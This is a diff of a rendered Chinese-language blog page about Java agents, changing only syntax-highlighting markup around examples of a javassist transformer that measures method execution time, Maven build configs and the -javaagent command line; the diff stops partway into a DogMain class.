@@ -362,14 +362,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Cat</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Cat is running&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">RandomUtils</span><span class="o">.</span><span class="na">nextLong</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="mi">7</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Cat</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Cat is running&#34;</span><span class="o">);</span>
+        <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">RandomUtils</span><span class="o">.</span><span class="na">nextLong</span><span class="o">(</span><span class="n">3</span><span class="o">,</span> <span class="n">7</span><span class="o">));</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>现在要利用 Java agent 测量 run 方法的执行时间，则需先构建 Java agent，因为它是 Jar 文件，要对被探测或追踪的程序起作用必然要先加载到 JVM，有两种方式，一是在 JVM 启动时通过命令行接口开启 agent；二是 JVM 启动后通过 Java Attach API 把 agent 附加到 JVM。</p>
 <p>首先以第一种方式来考虑 agent 类：</p>
@@ -383,13 +383,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ElapsedTimeAgent</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">inst</span><span class="o">.</span><span class="na">addTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">ElapsedTimeTransformer</span><span class="o">(</span><span class="n">agentArgs</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ElapsedTimeAgent</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">inst</span><span class="o">.</span><span class="na">addTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">ElapsedTimeTransformer</span><span class="o">(</span><span class="n">agentArgs</span><span class="o">));</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>此类实现了一个 <code>premain</code> 方法，它与我们常见的 <code>main</code> 方法相似，不仅都是作为执行的入口点，而且第一个方法参数的值来源于命令行，不过参数类型是字符串而不是字符串数组，命令行参数的解析交由用户实现；第二个参数类型是 <code>Instrumentation</code>，有两种获得其实例的方式：</p>
 <ol>
@@ -443,45 +443,45 @@
 </span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ElapsedTimeTransformer</span> <span class="kd">implements</span> <span class="n">ClassFileTransformer</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">agentArgs</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">ElapsedTimeTransformer</span><span class="o">()</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">ElapsedTimeTransformer</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">agentArgs</span> <span class="o">=</span> <span class="n">agentArgs</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">transform</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">classBeingRedefined</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">                            <span class="n">ProtectionDomain</span> <span class="n">protectionDomain</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classfileBuffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IllegalClassFormatException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">classfileBuffer</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">agentArgs</span><span class="o">))</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">                <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">classfileBuffer</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">                <span class="n">CtMethod</span><span class="o">[]</span> <span class="n">methods</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">getDeclaredMethods</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="o">(</span><span class="n">CtMethod</span> <span class="n">method</span> <span class="o">:</span> <span class="n">methods</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">addLocalVariable</span><span class="o">(</span><span class="s">&#34;begin&#34;</span><span class="o">,</span> <span class="n">CtClass</span><span class="o">.</span><span class="na">longType</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">addLocalVariable</span><span class="o">(</span><span class="s">&#34;end&#34;</span><span class="o">,</span> <span class="n">CtClass</span><span class="o">.</span><span class="na">longType</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="s">&#34;begin = System.nanoTime();&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">insertAfter</span><span class="o">(</span><span class="s">&#34;end = System.nanoTime();&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getLongName</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">String</span> <span class="n">x</span> <span class="o">=</span> <span class="s">&#34;System.out.println(\&#34;&#34;</span> <span class="o">+</span> <span class="n">methodName</span> <span class="o">+</span> <span class="s">&#34;\&#34; + \&#34;: \&#34; + (end - begin) + \&#34; ns\&#34;&#34;</span> <span class="o">+</span> <span class="s">&#34;);&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">insertAfter</span><span class="o">(</span><span class="n">x</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">                <span class="o">}</span>
-</span></span><span class="line"><span class="cl">                <span class="n">bytecode</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">                <span class="n">ctClass</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">CannotCompileException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">            <span class="o">}</span>
-</span></span><span class="line"><span class="cl">        <span class="o">}</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">bytecode</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ElapsedTimeTransformer</span> <span class="kd">implements</span> <span class="n">ClassFileTransformer</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">agentArgs</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">ElapsedTimeTransformer</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nf">ElapsedTimeTransformer</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">agentArgs</span> <span class="o">=</span> <span class="n">agentArgs</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">transform</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">classBeingRedefined</span><span class="o">,</span>
+                            <span class="n">ProtectionDomain</span> <span class="n">protectionDomain</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classfileBuffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IllegalClassFormatException</span> <span class="o">{</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">classfileBuffer</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">agentArgs</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">classfileBuffer</span><span class="o">));</span>
+                <span class="n">CtMethod</span><span class="o">[]</span> <span class="n">methods</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">getDeclaredMethods</span><span class="o">();</span>
+                <span class="k">for</span> <span class="o">(</span><span class="n">CtMethod</span> <span class="n">method</span> <span class="o">:</span> <span class="n">methods</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">method</span><span class="o">.</span><span class="na">addLocalVariable</span><span class="o">(</span><span class="s">&#34;begin&#34;</span><span class="o">,</span> <span class="n">CtClass</span><span class="o">.</span><span class="na">longType</span><span class="o">);</span>
+                    <span class="n">method</span><span class="o">.</span><span class="na">addLocalVariable</span><span class="o">(</span><span class="s">&#34;end&#34;</span><span class="o">,</span> <span class="n">CtClass</span><span class="o">.</span><span class="na">longType</span><span class="o">);</span>
+
+                    <span class="n">method</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="s">&#34;begin = System.nanoTime();&#34;</span><span class="o">);</span>
+                    <span class="n">method</span><span class="o">.</span><span class="na">insertAfter</span><span class="o">(</span><span class="s">&#34;end = System.nanoTime();&#34;</span><span class="o">);</span>
+                    <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getLongName</span><span class="o">();</span>
+                    <span class="n">String</span> <span class="n">x</span> <span class="o">=</span> <span class="s">&#34;System.out.println(\&#34;&#34;</span> <span class="o">+</span> <span class="n">methodName</span> <span class="o">+</span> <span class="s">&#34;\&#34; + \&#34;: \&#34; + (end - begin) + \&#34; ns\&#34;&#34;</span> <span class="o">+</span> <span class="s">&#34;);&#34;</span><span class="o">;</span>
+                    <span class="n">method</span><span class="o">.</span><span class="na">insertAfter</span><span class="o">(</span><span class="n">x</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="n">bytecode</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+                <span class="n">ctClass</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">CannotCompileException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">bytecode</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>重写 <code>transform</code> 方法允许我们用更改后的类代替原类并加载。具体实现是使用 javassist 的 API 去更改已加载类的字节码，在类方法体的开头和结尾分别插入获取当前的纳秒级时间戳语句，并在最后插入计算结果的打印语句，新类的字节码作为 <code>transform</code> 方法的返回值。<code>transform</code> 方法什么时候被调用？每一个新类被类加载器加载时。</p>
 <p>其次，新建 MANIFEST.MF 文件编写一些键值对告诉 JVM 这个 agent 类在哪里以及是否允许重定义类或重转换类：</p>
@@ -493,11 +493,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Manifest-Version: 1.0
-</span></span><span class="line"><span class="cl">Premain-Class: io.h2cone.trace.agent.ElapsedTimeAgent
-</span></span><span class="line"><span class="cl">Can-Redefine-Classes: true
-</span></span><span class="line"><span class="cl">Can-Retransform-Classes: true
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Manifest-Version: 1.0
+Premain-Class: io.h2cone.trace.agent.ElapsedTimeAgent
+Can-Redefine-Classes: true
+Can-Retransform-Classes: true
+</code></pre></td></tr></table>
 </div>
 </div><p>再次，利用 Maven 插件构建 agent jar 文件：</p>
 <div class="highlight"><div class="chroma">
@@ -526,29 +526,29 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;plugin&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>maven-assembly-plugin<span class="nt">&lt;/artifactId&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.1.1<span class="nt">&lt;/version&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;executions&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="nt">&lt;execution&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;phase&gt;</span>package<span class="nt">&lt;/phase&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;goals&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;goal&gt;</span>single<span class="nt">&lt;/goal&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/goals&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;configuration&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;finalName&gt;</span>agent<span class="nt">&lt;/finalName&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;archive&gt;</span>
-</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;manifestFile&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class="nt">&lt;/manifestFile&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/archive&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;descriptorRefs&gt;</span>
-</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;descriptorRef&gt;</span>jar-with-dependencies<span class="nt">&lt;/descriptorRef&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/descriptorRefs&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/configuration&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/execution&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/executions&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;/plugin&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;plugin&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>maven-assembly-plugin<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>3.1.1<span class="nt">&lt;/version&gt;</span>
+    <span class="nt">&lt;executions&gt;</span>
+        <span class="nt">&lt;execution&gt;</span>
+            <span class="nt">&lt;phase&gt;</span>package<span class="nt">&lt;/phase&gt;</span>
+            <span class="nt">&lt;goals&gt;</span>
+                <span class="nt">&lt;goal&gt;</span>single<span class="nt">&lt;/goal&gt;</span>
+            <span class="nt">&lt;/goals&gt;</span>
+            <span class="nt">&lt;configuration&gt;</span>
+                <span class="nt">&lt;finalName&gt;</span>agent<span class="nt">&lt;/finalName&gt;</span>
+                <span class="nt">&lt;archive&gt;</span>
+                    <span class="nt">&lt;manifestFile&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class="nt">&lt;/manifestFile&gt;</span>
+                <span class="nt">&lt;/archive&gt;</span>
+                <span class="nt">&lt;descriptorRefs&gt;</span>
+                    <span class="nt">&lt;descriptorRef&gt;</span>jar-with-dependencies<span class="nt">&lt;/descriptorRef&gt;</span>
+                <span class="nt">&lt;/descriptorRefs&gt;</span>
+            <span class="nt">&lt;/configuration&gt;</span>
+        <span class="nt">&lt;/execution&gt;</span>
+    <span class="nt">&lt;/executions&gt;</span>
+<span class="nt">&lt;/plugin&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>然后，给 Cat 类编写测试用的主类：</p>
 <div class="highlight"><div class="chroma">
@@ -561,13 +561,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CatMain</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Cat</span><span class="o">.</span><span class="na">run</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CatMain</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
+        <span class="n">Cat</span><span class="o">.</span><span class="na">run</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>并把两者构建成可执行且名为 app 的 jar 文件：</p>
 <div class="highlight"><div class="chroma">
@@ -596,29 +596,29 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;plugin&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>maven-shade-plugin<span class="nt">&lt;/artifactId&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;executions&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="nt">&lt;execution&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;goals&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;goal&gt;</span>shade<span class="nt">&lt;/goal&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/goals&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;configuration&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;finalName&gt;</span>app<span class="nt">&lt;/finalName&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;shadedArtifactAttached&gt;</span>true<span class="nt">&lt;/shadedArtifactAttached&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;transformers&gt;</span>
-</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;transformer</span> <span class="na">implementation=</span>
-</span></span><span class="line"><span class="cl">                                            <span class="s">&#34;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&#34;</span><span class="nt">&gt;</span>
-</span></span><span class="line"><span class="cl">                        <span class="nt">&lt;mainClass&gt;</span>io.h2cone.inst.app.CatMain<span class="nt">&lt;/mainClass&gt;</span>
-</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;/transformer&gt;</span>
-</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/transformers&gt;</span>
-</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/configuration&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/execution&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/executions&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;/plugin&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;plugin&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>maven-shade-plugin<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
+    <span class="nt">&lt;executions&gt;</span>
+        <span class="nt">&lt;execution&gt;</span>
+            <span class="nt">&lt;goals&gt;</span>
+                <span class="nt">&lt;goal&gt;</span>shade<span class="nt">&lt;/goal&gt;</span>
+            <span class="nt">&lt;/goals&gt;</span>
+            <span class="nt">&lt;configuration&gt;</span>
+                <span class="nt">&lt;finalName&gt;</span>app<span class="nt">&lt;/finalName&gt;</span>
+                <span class="nt">&lt;shadedArtifactAttached&gt;</span>true<span class="nt">&lt;/shadedArtifactAttached&gt;</span>
+                <span class="nt">&lt;transformers&gt;</span>
+                    <span class="nt">&lt;transformer</span> <span class="na">implementation=</span>
+                                            <span class="s">&#34;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&#34;</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;mainClass&gt;</span>io.h2cone.inst.app.CatMain<span class="nt">&lt;/mainClass&gt;</span>
+                    <span class="nt">&lt;/transformer&gt;</span>
+                <span class="nt">&lt;/transformers&gt;</span>
+            <span class="nt">&lt;/configuration&gt;</span>
+        <span class="nt">&lt;/execution&gt;</span>
+    <span class="nt">&lt;/executions&gt;</span>
+<span class="nt">&lt;/plugin&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>最后，得到了 agent-jar-with-dependencies.jar 和 app.jar 后，查阅 Java agent 命令行接口文档：</p>
 <div class="highlight"><div class="chroma">
@@ -626,8 +626,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">-javaagent:jarpath<span class="o">[=</span>options<span class="o">]</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">-javaagent:jarpath<span class="o">[=</span>options<span class="o">]</span>
+</code></pre></td></tr></table>
 </div>
 </div><p><code>jarpath</code> 是 agent jar 文件的路径，可选的 <code>options</code> 能传递给 agent 类的 <code>premain</code> 方法，这里传递 Cat 类的命名：io/h2cone/inst/app/Cat，表示我们要测量它的方法执行时间：</p>
 <div class="highlight"><div class="chroma">
@@ -635,8 +635,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">java -javaagent:agent-jar-with-dependencies.jar<span class="o">=</span>io/h2cone/inst/app/Cat -jar app.jar
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">java -javaagent:agent-jar-with-dependencies.jar<span class="o">=</span>io/h2cone/inst/app/Cat -jar app.jar
+</code></pre></td></tr></table>
 </div>
 </div><p>结果表明，不仅 Cat 类的 run 方法正常执行，而且输出了该方法的执行时间：</p>
 <div class="highlight"><div class="chroma">
@@ -645,9 +645,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cat is running
-</span></span><span class="line"><span class="cl">io.h2cone.inst.app.Cat.run(): 73993800 ns
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Cat is running
+io.h2cone.inst.app.Cat.run(): 73993800 ns
+</code></pre></td></tr></table>
 </div>
 </div><p>完整代码已发布，请参考 <a class="link" href="https://github.com/h2cone/java-examples/tree/master/inst-agent"  target="_blank" rel="noopener"
     >inst-agent</a> 和 <a class="link" href="https://github.com/h2cone/java-examples/tree/master/inst-app"  target="_blank" rel="noopener"
@@ -679,18 +679,18 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DogMain</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">
